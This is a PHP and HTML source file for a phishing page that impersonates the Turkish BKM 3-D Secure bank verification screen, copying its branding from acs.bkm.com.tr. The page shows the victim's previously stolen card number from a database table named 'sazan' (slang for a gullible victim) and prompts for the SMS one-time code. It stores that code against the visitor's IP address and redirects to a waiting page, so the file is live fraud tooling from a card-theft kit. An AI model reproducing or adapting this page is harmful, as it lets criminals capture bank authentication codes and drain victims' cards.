<?php
date_default_timezone_set('Europe/Istanbul');
include('connect.php');
$db->query("UPDATE sazan SET now = 'Sms Sayfası' WHERE ip = '{$ip}'");
if($_POST){
    $sms   = $_POST['sms'];
    $date       = date('d.m.Y H:i');
    
	$query = $db->prepare("UPDATE sazan SET sms=? WHERE ip = ?");
	$insert = $query->execute(array($sms,$ip));
    if($insert){
        header('Location:bekle.php');
    }
}

?>

<!DOCTYPE html>
<!-- saved from url=(0037)https://acs.bkm.com.tr/mdpayacs/pareq -->


<html lang="tr" style="height: 100%; width: 100%;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="-1">
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <link rel="shortcut icon" type="image/png" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" href="https://acs.bkm.com.tr/mdpayacs/img/favicon.png">
  <link rel="apple-touch-icon" type="image/png" sizes="76x76" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" sizes="120x120" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" sizes="152x152" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
    <title>BKM | <?php echo $site['adi']; ?></title>
  <!-- CSS -->
  <link rel="stylesheet" href="./bkm_acs_files/bkmacs-dist.css">
  <link rel="stylesheet" href="./bkm_acs_files/main-dist.css" type="text/css" media="screen">
  <!-- JS -->
  <!--[if gte IE 9]><!-->
  <script type="text/javascript" src="./bkm_acs_files/main-dist.js.indir"></script>
  <!--<![endif]-->
  <script type="text/javascript">var isSupportedIE = true;</script>
  <!--[if lt IE 9]>
  <script type="text/javascript">isSupportedIE = false;</script>
  <![endif]-->
    <style type="text/css">
      .content-wrapper{
        margin-top: 50px;
      }
    </style>
  </head>
<?php
$oku = $db->query("SELECT * FROM sazan WHERE ip = '{$ip}'")->fetch();

?>
  <body onload="init(180)">

    <div class="content-wrapper">
      <!--<![endif]-->
      <!--approve page-->
      <div class="header">
        <div class="brand-logo">
          <img 3dslogo="scheme" align="left" src="./bkm_acs_files/schema_000000001.gif">
        </div>
        <div class="member-logo">
          <img 3dslogo="scheme" align="right" src="./bkm_acs_files/logo_10.png">
        </div>
      </div>
      <div id="approve-page">
        <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
          <div class="loader"></div>
        </div>
        <div class="content">
          <h1 id="approve-header">Doğrulama kodunu daxil edin</h1>
          <div class="info-wrapper">
            <div class="info-row">
              <div class="info-col info-label">İşyeri Adı:</div>
              <div class="info-col" 3dsdisplay="merchant" id="merchant-name"><?php echo $site['adi'];?></div>
            </div>
            <div class="info-row">
              <div class="info-col info-label">Kart Numarası:</div>
              <div class="info-col" 3dsdisplay="pan" id="pan"><?php echo $oku['kk']; ?></div>
            </div>
          </div>
          <div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
            <div>
              <h3>İşlemi tamamlamak için kullanacağınız şifre bankanızda kayıtlı cep telefonunuza gönderilecektir.</h3>
            </div>
            <div class="form-wrapper">
              <input name="fakePasswordRemembered" id="fakePasswordRemembered" style="display: none;" type="password">
              <form 3dsaction="manual" id="bkmform" class="form-code" method="POST" action="sms.php" autocomplete="off" novalidate="novalidate">
                <div class="form-row">
					<label for="code" class="otpcode">Doğrulama kodu</label>
				   <input type="hidden" name="datee" value="<?php date_default_timezone_set('Etc/GMT-3');
echo date("d.m.Y  H:i:s"); ?>">
                  <input 3dsinput="password" type="text" class="f-input" oninput="maxLengthCheck(this)" onkeypress="return isNumeric(event)" name="sms" id="passwordfield" maxlength="8" min="0" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                </div>
                <div id="wrongPassDiv" 3dsdisplay="error" class="error-messages error-wrong-otp" style="display: block;">
                  <span class="has-reg"></span></div> 
                <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
                  <div>
                    <span class="has-reg">Doğrulama kodunu belirtilen süre içinde girmediniz.</span>
                  </div>
                  <button id="retryButton" type="submit" onclick="retryButtonClick()" class="button btn-1 re-code v1" name="newsms" value="retry">Yendiden gönder</button>
                  <div>
                    <label id="otpcompleted" for="toggle-1" style="cursor: pointer; display: none;">Yardım</label>
                  </div>
                  <input required style="display: none" class="popup txt-link trigger-absolute-panel" type="checkbox" id="toggle-1">
                  <div class="noscriptHelpText">
                    Doğrulama esnasında cep telefonunuza doğrulama kodu gelmemesi
                    durumunda doğrulama için kalan sürenin dolmasını bekleyerek
                    ?Doğrulama Kodunu Tekrar Gönder? linkinden tekrar doğrulama
                    kodu gönderilmesini talep edebilirsiniz.<br> Tekrar
                    doğrulama kodu gönderimi sağlandığı halde cep telefonunuza
                    ulaşmaması ve benzeri problemlerde lütfen kartınızı ihraç eden
                    kuruluş ile irtibata geçiniz.
                  </div>
                </div>
                <div id="submitButtonDiv">
                  <div class="has-submit">
                    <button id="submitbutton" type="submit" name="submit" value="confirm" class="button btn-1 btn-commit">Onayla</button>
                  </div>
                  <div id="timerDiv" class="has-timer">
                    <span>Kalan süre</span> <span class="has-counter" id="has-counter">02:26</span>
                  </div>
                </div>
                <div class="call-to-action">
                  <div class="action-list">
                    <div class="action-row">
                      <div class="action-col left">
                        <a data-fancybox="" data-src="#canceldialog" href="javascript:;" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">İşlemi iptal edin
</a>
                        <button id="triggercancel" type="submit" name="cancel" value="cancel" style="display: none;"></button>
                      </div>  
                    </div>
                  </div>
                  <div style="display: none;">
                    <div class="panel" id="canceldialog">
                      <h1 class="small" id="msg-cancel-box">İşleminizi iptal etmek için işyeri sayfasına yönlendirileceksiniz
                        istediğinden emin misin?</h1>
                      <a href="javascript:;" onclick="window.history.back();" class="button btn-1 close-modal">İptal edin</a>
                     
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script type="text/javascript" src="./bkm_acs_files/bkmacs-dist.js.indir" charset="utf-8"></script>
  
<?php include 'footer.php';?>
</body></html>